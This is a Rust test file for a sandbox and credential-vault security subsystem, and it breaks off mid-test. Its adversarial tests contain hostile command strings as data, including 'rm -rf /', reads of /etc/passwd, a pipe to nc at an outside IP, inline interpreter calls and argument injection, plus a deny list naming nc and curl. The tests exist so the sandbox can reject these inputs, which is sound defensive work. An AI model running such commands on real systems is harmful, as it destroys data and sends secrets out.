use std::fs;
use std::path::PathBuf;
use std::sync::Arc;
use uuid::Uuid;

use sail_common::{
    bus::EventBus,
    traits::Subsystem,
    types::{EventPayload, SailEvent, SubsystemId},
};
use sail_guardian::{
    clear_global_broker, global_broker, ApprovalBroker,
    ApprovalError, AuditIntegrityError, AuditLedger, Capability, CredentialError, CredentialHandle,
    CredentialStore, DecisionOutcome, DeviceCapability, ExecutionDenied, FsCapability, GuardianExecutionBroker,
    GuardianSubsystem, PolicyEngine, SandboxPolicy, SandboxViolation, SecretString,
    SystemCapability, ToolCapability, VaultStatus,
};

/// Fixture helper: sets up isolated temporary directories for persistent vault & audit
struct TestHarness {
    tmp_path: PathBuf,
    vault_dir: PathBuf,
    audit_file: PathBuf,
}

impl TestHarness {
    fn new() -> Self {
        let unique_id = Uuid::new_v4();
        let tmp_path = std::env::temp_dir().join(format!("sail-test-{}", unique_id));
        let vault_dir = tmp_path.join("vault");
        let audit_file = tmp_path.join("audit.log");
        let _ = fs::create_dir_all(&vault_dir);
        Self {
            tmp_path,
            vault_dir,
            audit_file,
        }
    }
}

impl Drop for TestHarness {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.tmp_path);
    }
}

// ------------------------------------------------------------------------------------------------
// [Issue #30]: Enforceable Sandbox — Traversal, Sibling Prefixes, Symlinks, Injection, Metachars
// ------------------------------------------------------------------------------------------------

#[test]
fn test_adversarial_sandbox_path_traversal_and_sibling_prefix() {
    let harness = TestHarness::new();
    let root = harness.tmp_path.join("workspace");
    fs::create_dir_all(&root).unwrap();

    let sibling_evil = harness.tmp_path.join("workspace-evil");
    fs::create_dir_all(&sibling_evil).unwrap();
    fs::write(sibling_evil.join("secret.txt"), "stolen data").unwrap();

    let mut sandbox = SandboxPolicy::new();
    sandbox = sandbox.with_root(&root);

    // 1. Sibling prefix attack: "/workspace-evil/secret.txt" sharing prefix with "/workspace"
    let sibling_file = sibling_evil.join("secret.txt");
    let res = sandbox.validate_path(&sibling_file, false);
    assert!(
        matches!(res, Err(SandboxViolation::PathEscapesRoot { .. })),
        "Sibling prefix must be denied, got: {:?}",
        res
    );

    // 2. Double dot traversal escapes: "/workspace/subdir/../../workspace-evil/secret.txt"
    let subdir = root.join("subdir");
    fs::create_dir_all(&subdir).unwrap();
    let traversal = subdir.join("../..").join("workspace-evil").join("secret.txt");
    let res = sandbox.validate_path(&traversal, false);
    assert!(
        matches!(res, Err(SandboxViolation::PathEscapesRoot { .. })),
        "Dot-dot traversal escape must be denied"
    );

    // 3. Symlink target escape attack: symlink inside workspace pointing to /etc/shadow or /tmp
    let symlink_path = root.join("escape_link");
    #[cfg(unix)]
    {
        use std::os::unix::fs::symlink;
        let _ = symlink("/etc/shadow", &symlink_path);
        if symlink_path.exists() {
            let res = sandbox.validate_path(&symlink_path, false);
            assert!(
                res.is_err(),
                "Symlink escaping to sensitive host target must be denied"
            );
        }
    }

    // 4. Special device files blocking
    #[cfg(unix)]
    {
        for dev in ["/dev/zero", "/dev/urandom", "/dev/null"] {
            let dev_path = PathBuf::from(dev);
            if dev_path.exists() {
                let res = sandbox.validate_path(&dev_path, false);
                assert!(
                    matches!(res, Err(SandboxViolation::SensitivePathBlocked { .. })),
                    "System device path must be blocked immediately"
                );
            }
        }
    }
}

#[test]
fn test_adversarial_sandbox_command_injection_and_interpreter_bypass() {
    let sandbox = SandboxPolicy::new();

    // 1. Shell metacharacters injection attempts
    let attacks = [
        "ls; rm -rf /",
        "ls && cat /etc/passwd",
        "echo `whoami`",
        "cat file | nc 1.2.3.4 9000",
        "git status > /dev/null",
        "ls $HOME",
        "git status\nrm -rf /",
    ];

    for attack in attacks {
        let res = sandbox.validate_command(attack);
        assert!(
            matches!(res, Err(SandboxViolation::ShellMetacharacterDetected { .. })),
            "Metacharacter attack '{attack}' must be rejected, got: {:?}",
            res
        );
    }

    // 2. Unapproved binaries
    for bin in ["reboot", "nmap", "nc", "curl", "python", "perl", "ruby"] {
        let res = sandbox.validate_command(bin);
        assert!(
            res.is_err(),
            "Unauthorized binary '{bin}' must be rejected from allowlist"
        );
    }

    // 3. Interpreter inline scripts bypass (-c, -e)
    for script_attack in [
        "bash -c 'id'",
        "sh -c 'uname -a'",
        "python3 -c 'import os; os.system(\"id\")'",
    ] {
        let res = sandbox.validate_command(script_attack);
        assert!(
            res.is_err(),
            "Inline interpreter execution must be strictly denied"
        );
    }

    // 4. Authorized commands without metacharacters succeed
    assert!(sandbox.validate_command("git status").is_ok());
    assert!(sandbox.validate_command("ls -la").is_ok());
    assert!(sandbox.validate_command("cargo check").is_ok());
}

#[test]
fn test_adversarial_sandbox_special_device_fifo_and_open_sandboxed_file() {
    let harness = TestHarness::new();
    let root = harness.tmp_path.join("workspace");
    fs::create_dir_all(&root).unwrap();

    let sandbox = SandboxPolicy::from_roots(vec![&root]);

    // 1. Regular file opens successfully via open_sandboxed_file
    let valid_file = root.join("valid_doc.txt");
    fs::write(&valid_file, "legitimate file data").unwrap();
    let file_handle = sandbox.open_sandboxed_file(&valid_file, false);
    assert!(file_handle.is_ok(), "Opening valid workspace file must succeed");

    // 2. FIFO special device file blocking
    #[cfg(unix)]
    {
        use std::ffi::CString;
        let fifo_path = root.join("test_fifo");
        let c_fifo = CString::new(fifo_path.to_str().unwrap()).unwrap();
        let res = unsafe { libc::mkfifo(c_fifo.as_ptr(), 0o644) };
        if res == 0 {
            let err = sandbox.validate_path(&fifo_path, false);
            assert!(
                matches!(err, Err(SandboxViolation::SpecialDeviceBlocked { .. })),
                "FIFO device node must be blocked with SpecialDeviceBlocked, got: {:?}",
                err
            );
            let open_res = sandbox.open_sandboxed_file(&fifo_path, false);
            assert!(
                matches!(open_res, Err(SandboxViolation::SpecialDeviceBlocked { .. })),
                "Opening FIFO must be rejected with SpecialDeviceBlocked, got: {:?}",
                open_res
            );
        }
    }

    // 3. Opening escaping file is rejected
    let outside_file = harness.tmp_path.join("outside.txt");
    fs::write(&outside_file, "outside data").unwrap();
    let open_escape = sandbox.open_sandboxed_file(&outside_file, false);
    assert!(
        matches!(open_escape, Err(SandboxViolation::PathEscapesRoot { .. })),
        "Opening file outside allowed roots must fail with PathEscapesRoot"
    );
}

#[test]
fn test_adversarial_sandbox_os_enforced_command_isolation_and_env_sanitization() {
    let harness = TestHarness::new();
    let workspace = harness.tmp_path.join("isolated_workspace");
    fs::create_dir_all(&workspace).unwrap();
    fs::write(workspace.join("sample.txt"), "hello isolated world").unwrap();

    let sandbox = SandboxPolicy::from_roots(vec![&workspace]);

    // Set a dummy secret in the current process
    unsafe {
        std::env::set_var("SAIL_SECRET_TOKEN", "super_secret_credentials_12345");
    }

    // 1. Prepare an authorized command: "ls"
    let cmd = sandbox
        .prepare_command("ls", &["-la".to_string()], Some(&workspace))
        .expect("ls must be allowed");
    assert_eq!(cmd.binary, "ls");
    assert_eq!(cmd.current_dir, fs::canonicalize(&workspace).unwrap());

    // 2. Verify sanitized environment stripped secrets
    assert!(!cmd.env.contains_key("SAIL_SECRET_TOKEN"));
    assert!(!cmd.env.contains_key("AWS_SECRET_ACCESS_KEY"));
    assert_eq!(cmd.env.get("TERM"), Some(&"dumb".to_string()));
    assert_eq!(cmd.env.get("LANG"), Some(&"C.UTF-8".to_string()));

    // 3. Execute isolated command
    let output = sandbox.execute_command(&cmd).expect("Command execution failed");
    assert_eq!(output.status, 0);
    assert!(output.stdout.contains("sample.txt"));

    // 4. Command injection attack with shell metacharacters in arguments is rejected
    let injection_res = sandbox.prepare_command(
        "ls",
        &["sample.txt; touch /tmp/evil.txt".to_string()],
        Some(&workspace),
    );
    assert!(matches!(
        injection_res,
        Err(SandboxViolation::ShellMetacharacterDetected { character: ';' })
    ));

    // 5. Subprocess escape via find -exec is rejected
    let find_exec_res = sandbox.prepare_command(
        "find",
        &[".".to_string(), "-exec".to_string(), "id".to_string()],
        Some(&workspace),
    );
    assert!(matches!(
        find_exec_res,
        Err(SandboxViolation::CommandArgumentDenied { .. })
    ));

    // 6. Subprocess escape via git config or git --exec-path is rejected
    let git_config_res = sandbox.prepare_command(
        "git",
        &["config".to_string(), "core.editor".to_string(), "evil".to_string()],
        Some(&workspace),
    );
    assert!(matches!(
        git_config_res,
        Err(SandboxViolation::CommandArgumentDenied { .. })
    ));

    let git_exec_res = sandbox.prepare_command(
        "git",
        &["--exec-path=/tmp".to_string(), "status".to_string()],
        Some(&workspace),
    );
    assert!(matches!(
        git_exec_res,
        Err(SandboxViolation::CommandArgumentDenied { .. })
    ));

    // 7. Working directory outside allowed roots is strictly rejected
    let outside_dir = PathBuf::from("/etc");
    let workdir_violation = sandbox.prepare_command("ls", &[], Some(&outside_dir));
    assert!(matches!(
        workdir_violation,
        Err(SandboxViolation::WorkingDirectoryViolation { .. })
    ));
}

#[test]
fn test_adversarial_denied_command_leaves_filesystem_unchanged() {
    let harness = TestHarness::new();
    let workspace = harness.tmp_path.join("workspace");
    fs::create_dir_all(&workspace).unwrap();

    let target_probe = harness.tmp_path.join("should_not_exist.txt");
    let sandbox = SandboxPolicy::from_roots(vec![&workspace]);

    // Attacker attempts command injection to create file
    let malicious_cmd = format!("ls; touch {}", target_probe.display());
    let res = sandbox.validate_command(&malicious_cmd);
    assert!(res.is_err(), "Malicious command must be denied");

    // Attacker attempts interpreter bypass
    let script_attack = format!("sh -c 'touch {}'", target_probe.display());
    let res2 = sandbox.validate_command(&script_attack);
    assert!(res2.is_err(), "Interpreter command must be denied");

    // Target file MUST NOT exist on the filesystem
    assert!(
        !target_probe.exists(),
        "Filesystem must remain completely unchanged when command is denied"
    );
}

#[test]
fn test_adversarial_sandbox_root_portability_and_proc_narrowing() {
    let harness = TestHarness::new();
    let custom_root = harness.tmp_path.join("custom_portable_root");
    fs::create_dir_all(&custom_root).unwrap();
    let sample = custom_root.join("portability_test.txt");
    fs::write(&sample, "portable root content").unwrap();

    // 1. Policy constructed with explicit portable roots (no hardcoded user paths)
    let sandbox = SandboxPolicy::from_roots(vec![&custom_root]);
    assert!(sandbox.is_path_allowed(&sample, false));

    // Paths outside custom_root are denied
    assert!(!sandbox.is_path_allowed(&PathBuf::from("/etc/passwd"), false));
    assert!(!sandbox.is_path_allowed(&PathBuf::from("/root/secret.txt"), false));

    // 2. Proc telemetry whitelist
    assert!(sandbox.is_path_allowed(&PathBuf::from("/proc/uptime"), false));
    assert!(sandbox.is_path_allowed(&PathBuf::from("/proc/loadavg"), false));
    assert!(sandbox.is_path_allowed(&PathBuf::from("/proc/meminfo"), false));
    assert!(sandbox.is_path_allowed(&PathBuf::from("/proc/cpuinfo"), false));
    assert!(sandbox.is_path_allowed(&PathBuf::from("/proc/stat"), false));

    // 3. Proc sensitive files strictly blocked
    assert!(!sandbox.is_path_allowed(&PathBuf::from("/proc/sys/kernel/hostname"), false));
    assert!(!sandbox.is_path_allowed(&PathBuf::from("/proc/self/environ"), false));
    assert!(!sandbox.is_path_allowed(&PathBuf::from("/proc/kcore"), false));
    assert!(!sandbox.is_path_allowed(&PathBuf::from("/proc/sched_debug"), false));

    // 4. Any write to /proc is blocked
    assert!(!sandbox.is_path_allowed(&PathBuf::from("/proc/uptime"), true));
    assert!(!sandbox.is_path_allowed(&PathBuf::from("/proc/sys/vm/drop_caches"), true));
}

// ------------------------------------------------------------------------------------------------
// [Issue #31]: Approvals, Single-Use Capability Tokens, Replay Protection & Revocation
// ------------------------------------------------------------------------------------------------

#[test]
fn test_adversarial_capability_token_replay_and_tampering() {
    let broker = ApprovalBroker::new();

    let cap = Capability::Filesystem(FsCapability::Write {
        path: PathBuf::from("/home/main/SAIL/config.toml"),
    });

    let session = broker.create_session(SubsystemId::Bridge, cap.clone(), "Update repository config");

    // 1. Resolve session with approval
    let token = broker.resolve_session(session.session_id, true).expect("Approval should issue token");
    assert_eq!(token.bound_actor, SubsystemId::Bridge);
    assert_eq!(token.bound_capability, cap);

    // 2. Consume token on first valid execution
    let consumed = broker.consume_token(token.token_id, SubsystemId::Bridge, &cap);
    assert!(consumed.is_ok(), "First consumption must succeed");

    // 3. Replay attack: consuming the exact same token a second time must FAIL
    let replayed = broker.consume_token(token.token_id, SubsystemId::Bridge, &cap);
    assert!(
        matches!(replayed, Err(sail_guardian::TokenConsumptionError::TokenReplayed(tid)) if tid == token.token_id),
        "Replayed token consumption must be rejected"
    );

    // 4. Actor impersonation attack: different subsystem attempts to consume the token
    let session2 = broker.create_session(SubsystemId::Bridge, cap.clone(), "Legitimate Bridge session");
    let token2 = broker.resolve_session(session2.session_id, true).unwrap();
    let impersonation = broker.consume_token(token2.token_id, SubsystemId::Agents, &cap);
    assert!(
        matches!(impersonation, Err(sail_guardian::TokenConsumptionError::ActorMismatch { .. })),
        "Subsystem impersonation attempt must be rejected"
    );

    // 5. Parameter tampering / reparameterization attack: token was approved for config.toml, but attacker targets /etc/shadow
    let session3 = broker.create_session(SubsystemId::Bridge, cap.clone(), "Legitimate config write");
    let token3 = broker.resolve_session(session3.session_id, true).unwrap();
    let tampered_cap = Capability::Filesystem(FsCapability::Write {
        path: PathBuf::from("/etc/shadow"),
    });
    let tampering = broker.consume_token(token3.token_id, SubsystemId::Bridge, &tampered_cap);
    assert!(
        matches!(tampering, Err(sail_guardian::TokenConsumptionError::CapabilityMismatch)),
        "Reparameterization with altered target resource must be rejected"
    );
}

#[test]
fn test_adversarial_revocation_takes_immediate_effect() {
    let broker = ApprovalBroker::new();

    let cap = Capability::Tool(ToolCapability::CliCommand("git pull".into()));
    let session = broker.create_session(SubsystemId::Dialogue, cap.clone(), "Sync repository");
    let token = broker.resolve_session(session.session_id, true).unwrap();

    // Revoke grant immediately
    broker.revoke_grant(token.token_id);
    assert!(broker.is_revoked(token.token_id));

    // Attempting to consume revoked token fails closed
    let res = broker.consume_token(token.token_id, SubsystemId::Dialogue, &cap);
    assert!(
        matches!(res, Err(sail_guardian::TokenConsumptionError::Revoked(tid)) if tid == token.token_id),
        "Revoked token must be rejected"
    );
}

#[test]
fn test_adversarial_fake_approval_resolution_from_untrusted_clients_is_denied() {
    let broker = ApprovalBroker::new();
    let cap = Capability::Device(DeviceCapability::Camera);
    let session = broker.create_session(SubsystemId::Bridge, cap, "Camera access request");

    // 1. Untrusted subsystems (Agents, Dialogue, Mind, Flow, Bridge) attempt to resolve the session
    let untrusted_resolvers = [
        SubsystemId::Agents,
        SubsystemId::Dialogue,
        SubsystemId::Mind,
        SubsystemId::Flow,
        SubsystemId::Bridge,
    ];

    for untrusted in untrusted_resolvers {
        let fake_res = broker.resolve_session_authenticated(session.session_id, true, untrusted);
        assert_eq!(
            fake_res,
            Err(ApprovalError::UnauthorizedResolver(untrusted)),
            "Untrusted resolver {untrusted:?} must be denied from resolving approval sessions"
        );
    }

    // 2. Only trusted interactive Core daemon can authenticate and resolve
    let valid_res =
        broker.resolve_session_authenticated(session.session_id, true, SubsystemId::Core);
    assert!(
        valid_res.is_ok(),
        "Core UI daemon must successfully resolve approved session"
    );
}

#[tokio::test]
async fn test_adversarial_fake_approval_event_on_bus_is_rejected_and_audited() {
    let bus = EventBus::new();
    let mut guardian = GuardianSubsystem::new();
    guardian.init(&bus).await.unwrap();
    guardian.start().await.unwrap();

    // Create a pending approval session
    let cap = Capability::Tool(ToolCapability::CliCommand("sudo systemctl restart".into()));
    let session =
        guardian
            .approval()
            .create_session(SubsystemId::Bridge, cap, "Admin restart");

    // Untrusted actor (Agents) attempts to publish a fake UserApprovalResolved event
    let fake_event = SailEvent::new(
        SubsystemId::Agents,
        EventPayload::UserApprovalResolved {
            request_id: session.session_id.to_string(),
            approved: true,
        },
    );

    guardian.handle_event(&fake_event).await.unwrap();

    // Session MUST still be pending and not resolved
    let pending = guardian.approval().list_pending();
    assert_eq!(pending.len(), 1);
    assert_eq!(pending[0].session_id, session.session_id);

    // Audit log must record the fake resolution attempt as Denied
    let audit_list = guardian.audit().list(10);
    assert!(
        audit_list.iter().any(|r| r.outcome == DecisionOutcome::Denied
            && r.reason
                .contains("Unauthorized approval resolution attempt")),
        "Fake approval attempt must be recorded as Denied in audit ledger"
    );
}

#[test]
fn test_adversarial_device_activity_indicators_and_immediate_stop_semantics() {
    let broker = ApprovalBroker::new();

    // 1. Initially no active devices
    assert!(broker.active_device_indicators().is_empty());
    assert!(!broker.is_device_active(DeviceCapability::Camera));
    assert!(!broker.is_device_active(DeviceCapability::Microphone));

    // 2. Register active camera and microphone capture
    let cam_indicator = broker
        .register_device_activity(DeviceCapability::Camera, SubsystemId::Dialogue)
        .expect("Register camera activity failed");
    assert_eq!(cam_indicator.device, DeviceCapability::Camera);
    assert!(cam_indicator.is_active);

    let mic_indicator = broker
        .register_device_activity(DeviceCapability::Microphone, SubsystemId::Dialogue)
        .expect("Register mic activity failed");
    assert_eq!(mic_indicator.device, DeviceCapability::Microphone);
    assert!(mic_indicator.is_active);

    assert_eq!(broker.active_device_indicators().len(), 2);
    assert!(broker.is_device_active(DeviceCapability::Camera));
    assert!(broker.is_device_active(DeviceCapability::Microphone));

    // 3. Issue capability token for camera
    let cam_cap = Capability::Device(DeviceCapability::Camera);
    let session = broker.create_session(SubsystemId::Dialogue, cam_cap.clone(), "Video turn");
    let token = broker.resolve_session(session.session_id, true).unwrap();
    assert!(!broker.is_revoked(token.token_id));

    // 4. Immediate stop semantics on camera
    broker.stop_device(DeviceCapability::Camera);
    assert!(!broker.is_device_active(DeviceCapability::Camera));
    assert!(broker.is_device_active(DeviceCapability::Microphone)); // mic is unaffected
    assert_eq!(broker.active_device_indicators().len(), 1);

    // Token for camera must be revoked immediately
    assert!(broker.is_revoked(token.token_id));
    assert_eq!(
        broker.consume_token(token.token_id, SubsystemId::Dialogue, &cam_cap),
        Err(sail_guardian::TokenConsumptionError::Revoked(
            token.token_id
        ))
    );

    // 5. Emergency stop halts all devices immediately
    broker.emergency_stop_all_devices();
    assert!(broker.active_device_indicators().is_empty());
    assert!(!broker.is_device_active(DeviceCapability::Microphone));
}

#[tokio::test]
async fn test_adversarial_denied_or_expired_approval_never_records_granted_execution() {
    let bus = EventBus::new();
    let mut guardian = GuardianSubsystem::new();
    guardian.init(&bus).await.unwrap();
    guardian.start().await.unwrap();

    let cap = Capability::Tool(ToolCapability::KernelTool("danger:format".into()));
    let session = guardian
        .approval()
        .create_session(SubsystemId::Bridge, cap.clone(), "Format storage");

    // Core daemon sends UserApprovalResolved with approved: false
    let deny_event = SailEvent::new(
        SubsystemId::Core,
        EventPayload::UserApprovalResolved {
            request_id: session.session_id.to_string(),
            approved: false,
        },
    );

    guardian.handle_event(&deny_event).await.unwrap();

    // Session is removed from pending
    assert!(guardian.approval().list_pending().is_empty());

    // Audit ledger MUST record Denied outcome, NEVER Granted
    let audit_entries = guardian.audit().list(10);
    assert!(audit_entries
        .iter()
        .all(|r| r.outcome != DecisionOutcome::Granted));
    assert!(audit_entries
        .iter()
        .any(|r| r.outcome == DecisionOutcome::Denied));
}

// ------------------------------------------------------------------------------------------------
// [Issue #29]: Execution Boundary Broker & Fail-Closed Gatekeeping
// ------------------------------------------------------------------------------------------------

#[test]
fn test_adversarial_execution_broker_fails_closed_when_guardian_unavailable() {
    // 1. Explicitly clear global broker to simulate Guardian service failure or bypass
    clear_global_broker();

    // Any attempt to retrieve global broker fails closed
    let broker_res = global_broker();
    assert!(
        matches!(broker_res, Err(ExecutionDenied::GuardianUnavailable)),
        "Uninitialized Guardian must fail closed"
    );
}

#[test]
fn test_adversarial_denied_execution_produces_zero_side_effects() {
    let harness = TestHarness::new();
    let root = harness.tmp_path.join("sandbox");
    fs::create_dir_all(&root).unwrap();

    let target_file = harness.tmp_path.join("must_never_exist.txt");

    let policy = Arc::new(PolicyEngine::new());
    let audit = Arc::new(AuditLedger::new());
    let approval = Arc::new(ApprovalBroker::new());
    let mut sandbox = SandboxPolicy::new();
    sandbox = sandbox.with_root(&root);
    let sandbox = Arc::new(sandbox);

    let broker = GuardianExecutionBroker::new(policy, audit.clone(), approval, sandbox);

    // Attempt execution outside sandbox
    let outside_cap = Capability::Filesystem(FsCapability::Write {
        path: target_file.clone(),
    });

    let mut side_effect_executed = false;
    let res = broker.authorize_and_execute(
        SubsystemId::Dialogue,
        outside_cap,
        None,
        None,
        || {
            side_effect_executed = true;
            fs::write(&target_file, "corrupt").unwrap();
        },
    );

    assert!(res.is_err(), "Execution outside sandbox must be denied");
    assert!(!side_effect_executed, "Side-effect function must never run on deny");
    assert!(!target_file.exists(), "No filesystem side effects must be produced");

    // Denial must be logged in audit trail
    assert_eq!(audit.len(), 1);
    let receipts = audit.list(1);
    assert_eq!(receipts[0].outcome, DecisionOutcome::Denied);
}

// ------------------------------------------------------------------------------------------------
// [Issue #32]: Encrypted Credential Vault & Leakage Redaction
// ------------------------------------------------------------------------------------------------

#[test]
fn test_adversarial_encrypted_vault_survives_restart_and_rejects_tampering() {
    let harness = TestHarness::new();
    let secret_val = "sk_live_super_secret_token_12345";

    // 1. Open persistent encrypted vault and store credential
    {
        let vault = CredentialStore::open_persistent(&harness.vault_dir).expect("Open vault failed");
        let handle = vault
            .store_credential(
                SubsystemId::Bridge,
                "stripe_api",
                secret_val,
                "read:charges",
                chrono::Duration::hours(2),
            )
            .expect("Store failed");

        assert_eq!(handle.owner, SubsystemId::Bridge);
        assert_eq!(handle.scope, "read:charges");
    }

    // 2. Restart simulation: reopen persistent vault from disk
    {
        let restarted = CredentialStore::open_persistent(&harness.vault_dir).expect("Reopen vault failed");
        let handle = restarted
            .get_handle(SubsystemId::Bridge, "stripe_api", "read:charges")
            .expect("Handle resolution failed");

        // Verify secret execution works via handle
        let verified = restarted.execute_with_secret(&handle, SubsystemId::Bridge, |s| s == secret_val);
        assert_eq!(verified, Ok(true));

        // Untrusted subsystems cannot request handles or execute
        let unauthorized = restarted.get_handle(SubsystemId::Agents, "stripe_api", "read:charges");
        assert!(matches!(unauthorized, Err(CredentialError::UntrustedCaller(SubsystemId::Agents))));

        // Other subsystems cannot access keys they do not own
        let other_subsystem = restarted.get_handle(SubsystemId::Discovery, "stripe_api", "read:charges");
        assert!(matches!(other_subsystem, Err(CredentialError::NotFound(..))));
    }

    // 3. Redaction verification: raw secret is stripped from logs
    {
        let vault = CredentialStore::open_persistent(&harness.vault_dir).unwrap();
        let log_line = format!("Error while communicating: authorization failed for token {secret_val} on host");
        let sanitized = vault.redact_text(&log_line);
        assert!(!sanitized.contains(secret_val), "Raw secret must be redacted from log strings");
        assert!(sanitized.contains("[REDACTED_SECRET]"));
    }

    // 4. Vault ciphertext tampering test
    {
        let enc_path = harness.vault_dir.join("vault.enc");
        let mut bytes = fs::read(&enc_path).unwrap();
        // Flip one byte in the ciphertext payload
        let last = bytes.len() - 1;
        bytes[last] ^= 0xFF;
        fs::write(&enc_path, bytes).unwrap();

        let tampered_open = CredentialStore::open_persistent(&harness.vault_dir);
        assert!(
            tampered_open.is_err(),
            "Tampered vault ciphertext must fail decryption and fail closed"
        );
    }
}

#[test]
fn test_adversarial_vault_lock_unlock_and_zeroize_memory() {
    let harness = TestHarness::new();
    let secret_val = "prod_db_super_secret_credentials_67890";

    // 1. Open persistent vault, store credential, obtain key
    let key_bytes = {
        let vault = CredentialStore::open_persistent(&harness.vault_dir).unwrap();
        vault
            .store_credential(
                SubsystemId::Bridge,
                "postgres_url",
                secret_val,
                "db:write",
                chrono::Duration::hours(1),
            )
            .unwrap();

        assert_eq!(vault.status(), VaultStatus::Unlocked);
        assert!(!vault.is_locked());

        // Read key from disk for unlock test
        fs::read(harness.vault_dir.join("vault.key")).unwrap()
    };

    // 2. Lock the vault and verify fail-closed behavior
    {
        let vault = CredentialStore::open_persistent(&harness.vault_dir).unwrap();
        let handle = vault
            .get_handle(SubsystemId::Bridge, "postgres_url", "db:write")
            .unwrap();

        // Lock vault
        vault.lock();
        assert_eq!(vault.status(), VaultStatus::Locked);
        assert!(vault.is_locked());

        // Any attempt to retrieve or execute fails with VaultLocked
        assert_eq!(
            vault.get_handle(SubsystemId::Bridge, "postgres_url", "db:write"),
            Err(CredentialError::VaultLocked)
        );
        assert_eq!(
            vault.execute_with_secret(&handle, SubsystemId::Bridge, |_| ()),
            Err(CredentialError::VaultLocked)
        );
        assert_eq!(
            vault.store_credential(
                SubsystemId::Bridge,
                "new_key",
                "sec",
                "*",
                chrono::Duration::hours(1)
            ),
            Err(CredentialError::VaultLocked)
        );
        assert_eq!(vault.get_secret(SubsystemId::Bridge, "postgres_url"), None);

        // 3. Unlock with wrong key fails
        let wrong_key = [0xAAu8; 32];
        let unlock_err = vault.unlock(&wrong_key);
        assert!(unlock_err.is_err());
        assert!(vault.is_locked());

        // 4. Unlock with correct master key succeeds and restores access
        vault
            .unlock(&key_bytes)
            .expect("Unlock with valid key must succeed");
        assert_eq!(vault.status(), VaultStatus::Unlocked);
        assert!(!vault.is_locked());

        let restored_handle = vault
            .get_handle(SubsystemId::Bridge, "postgres_url", "db:write")
            .unwrap();
        let check =
            vault.execute_with_secret(&restored_handle, SubsystemId::Bridge, |s| s == secret_val);
        assert_eq!(check, Ok(true));
    }
}

#[test]
fn test_adversarial_untrusted_callers_cannot_request_credentials() {
    let harness = TestHarness::new();
    let vault = CredentialStore::open_persistent(&harness.vault_dir).unwrap();

    vault
        .store_credential(
            SubsystemId::Bridge,
            "api_key",
            "secret_api_key_value",
            "api:read",
            chrono::Duration::hours(2),
        )
        .unwrap();

    // Untrusted model/agent subsystems: Dialogue, Agents, Mind, Canvas
    let untrusted_callers = [
        SubsystemId::Dialogue,
        SubsystemId::Agents,
        SubsystemId::Mind,
        SubsystemId::Canvas,
    ];

    for untrusted in untrusted_callers {
        // 1. Cannot get raw secrets
        assert_eq!(
            vault.get_secret(untrusted, "api_key"),
            None,
            "Untrusted caller {untrusted:?} must never receive raw secrets"
        );

        // 2. Cannot request handles
        let handle_res = vault.get_handle(untrusted, "api_key", "api:read");
        assert_eq!(
            handle_res,
            Err(CredentialError::UntrustedCaller(untrusted)),
            "Untrusted caller {untrusted:?} must be rejected with UntrustedCaller"
        );

        // 3. Even with a valid Bridge handle, untrusted caller cannot execute
        let bridge_handle = vault
            .get_handle(SubsystemId::Bridge, "api_key", "api:read")
            .unwrap();
        let exec_res = vault.execute_with_secret(&bridge_handle, untrusted, |_| ());
        assert_eq!(
            exec_res,
            Err(CredentialError::UntrustedCaller(untrusted)),
            "Untrusted caller {untrusted:?} must not be allowed to execute closure"
        );
    }
}

#[test]
fn test_adversarial_connector_scope_isolation_by_resource_account_operation() {
    let harness = TestHarness::new();
    let vault = CredentialStore::open_persistent(&harness.vault_dir).unwrap();

    vault
        .store_credential(
            SubsystemId::Bridge,
            "github_pat",
            "ghp_my_personal_github_token_9876543210",
            "github.com:personal:repo:read",
            chrono::Duration::hours(4),
        )
        .unwrap();

    // 1. Requesting exact or narrower scope succeeds
    let valid_handle = vault
        .get_handle(
            SubsystemId::Bridge,
            "github_pat",
            "github.com:personal:repo:read",
        )
        .expect("Matching scope must succeed");

    // 2. Requesting broader scope (e.g. write instead of read) fails
    let write_scope_err = vault.get_handle(
        SubsystemId::Bridge,
        "github_pat",
        "github.com:personal:repo:write",
    );
    assert!(matches!(
        write_scope_err,
        Err(CredentialError::ScopeMismatch { .. })
    ));

    // 3. Requesting different resource (e.g. gitlab.com) fails
    let resource_err = vault.get_handle(
        SubsystemId::Bridge,
        "github_pat",
        "gitlab.com:personal:repo:read",
    );
    assert!(matches!(
        resource_err,
        Err(CredentialError::ScopeMismatch { .. })
    ));

    // 4. Requesting different account (e.g. org instead of personal) fails
    let account_err = vault.get_handle(
        SubsystemId::Bridge,
        "github_pat",
        "github.com:org:repo:read",
    );
    assert!(matches!(
        account_err,
        Err(CredentialError::ScopeMismatch { .. })
    ));

    // 5. Scoped action execution validates target resource, account, and operation
    let exec_ok = vault.execute_with_scoped_action(
        &valid_handle,
        SubsystemId::Bridge,
        "github.com",
        Some("personal"),
        "repo:read",
        |sec| sec.starts_with("ghp_"),
    );
    assert_eq!(exec_ok, Ok(true));

    // Executing against unauthorized operation fails
    let exec_forbidden_op = vault.execute_with_scoped_action(
        &valid_handle,
        SubsystemId::Bridge,
        "github.com",
        Some("personal"),
        "repo:delete",
        |_| (),
    );
    assert!(matches!(
        exec_forbidden_op,
        Err(CredentialError::ScopeMismatch { .. })
    ));
}

#[test]
fn test_adversarial_zeroize_debug_and_audit_receipt_redaction() {
    let harness = TestHarness::new();
    let secret = "sk_live_very_confidential_stripe_api_key_44332211";
    let token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789";

    // 1. SecretString never exposes raw secrets in Debug or Display
    let sec_str = SecretString::new(secret);
    let debug_out = format!("{:?}", sec_str);
    let display_out = format!("{}", sec_str);
    assert_eq!(debug_out, "[REDACTED_SECRET]");
    assert_eq!(display_out, "[REDACTED_SECRET]");
    assert!(!debug_out.contains(secret));
    assert!(!display_out.contains(secret));

    // 2. redact_text sanitizes known secrets, bearer tokens, and prefixed keys
    let vault = CredentialStore::open_persistent(&harness.vault_dir).unwrap();
    vault
        .store_credential(
            SubsystemId::Bridge,
            "stripe_key",
            secret,
            "*",
            chrono::Duration::hours(1),
        )
        .unwrap();

    let raw_trace =
        format!("Sending request: Authorization: Bearer {secret} with backup token={token}");
    let redacted = vault.redact_text(&raw_trace);
    assert!(!redacted.contains(secret));
    assert!(!redacted.contains(token));
    assert!(redacted.contains("[REDACTED_SECRET]"));

    // 3. JSON value redaction sanitizes sensitive fields
    let json_val = serde_json::json!({
        "username": "admin",
        "api_token": secret,
        "nested": {
            "password": "unencrypted_pass",
            "url": "https://api.example.com",
        }
    });
    let redacted_json = vault.redact_value(&json_val);
    let json_str = serde_json::to_string(&redacted_json).unwrap();
    assert!(!json_str.contains(secret));
    assert!(!json_str.contains("unencrypted_pass"));

